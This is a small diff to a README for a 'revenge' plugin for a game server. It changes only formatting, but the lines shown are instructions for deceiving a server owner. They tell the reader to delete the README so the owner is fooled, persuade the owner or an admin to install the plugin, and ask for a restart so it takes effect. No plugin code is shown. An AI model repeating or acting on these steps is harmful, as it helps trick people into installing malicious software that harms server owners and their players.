@@ -3,7 +3,7 @@ Are you in need of revenge to a server or server owner? Here's a lovely plugin t
 players.
 
 Beginning:
-- Download the plugin, remove the README.md (because this is just a guide to actually fooling the owner).
+- Download the plugin, **remove the README.md** (because this is just a guide to actually fooling the owner).
 - Convince the server owner or admin to download the plugin you sent him/her.
 - Once installed into the server, if the owner already hasn't, ask for a restart.
 
